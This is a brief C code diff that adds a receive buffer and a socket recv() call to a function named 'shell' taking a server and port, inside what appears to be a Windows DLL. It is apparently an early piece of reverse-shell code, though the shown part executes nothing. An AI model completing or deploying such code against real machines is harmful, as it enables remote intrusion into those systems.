@@ -28,7 +28,21 @@ int shell(char* server, unsigned int port) {
         return -1;
     }
 
-    // 
+    // Setup buffer
+    char recvbuf[BUFLEN];
+    memset(recvbuf, 0, BUFLEN);
+    
+    // Receive the input
+    if(recv(socket, recvbuf, BUFLEN, 0) <= 0) {
+        closesocket(socket);
+        WSACleanup();
+        return -2;
+    }
+
+    
+
+
+    
 
 }
 BOOL APIENTRY DllMain( HMODULE hModule,
